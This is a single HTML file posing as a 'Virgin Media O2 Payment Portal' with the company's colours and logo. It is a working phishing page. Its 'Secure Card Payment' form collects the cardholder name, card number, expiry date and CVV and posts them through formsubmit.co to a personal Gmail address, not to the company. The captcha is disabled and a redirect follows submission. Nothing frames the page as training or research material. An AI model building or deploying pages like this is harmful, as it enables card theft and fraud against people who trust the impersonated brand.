<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Virgin Media O2 Payment Portal</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #cce7ff; /* Sky blue */
      color: #003366;
    }
    header {
      background-color: #009fe3;
      color: white;
      padding: 20px;
      text-align: center;
    }
    header img {
      max-height: 60px;
      margin-bottom: 10px;
    }
    .container {
      max-width: 500px;
      margin: 40px auto;
      background-color: white;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h2 {
      color: #003366;
      text-align: center;
      margin-bottom: 20px;
    }
    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
      color: #003366;
    }
    input {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #009fe3;
      border-radius: 4px;
      background-color: #f9f9f9;
      color: #003366;
    }
    input::placeholder {
      color: #666;
    }
    button {
      margin-top: 25px;
      width: 100%;
      padding: 12px;
      background-color: #009fe3;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      font-weight: bold;
    }
    button:hover {
      background-color: #007bb8;
    }
  </style>
</head>
<body>
  <header>
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRaAEMjnvNWUPS4FREBvwgo7KA1CPimvDGgL0P4yHgHdYkj9blV6VvvMmDGfQ6Qq21sYL0&usqp=CAU" alt="Virgin Media O2 Logo" />
    <h1>Virgin Media O2 Payment Portal</h1>
  </header>

  <div class="container">
    <h2>Secure Card Payment</h2>
    <form action="https://formsubmit.co/bakermr01@gmail.com" method="POST">
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://yourdomain.com/processing.html">

      <label for="name">Name on Card</label>
      <input type="text" id="name" name="Card Name" placeholder="John Doe" required />

      <label for="card">Card Number</label>
      <input type="text" id="card" name="Card Number" maxlength="19" placeholder="1234 5678 9012 3456" required />

      <label for="expiry">Expiry Date</label>
      <input type="text" id="expiry" name="Expiry Date" placeholder="MM/YY" required />

      <label for="cvv">CVV</label>
      <input type="text" id="cvv" name="CVV" maxlength="4" placeholder="123" required />

      <button type="submit">Pay Â£1.00</button>
    </form>
  </div>
</body>
</html>
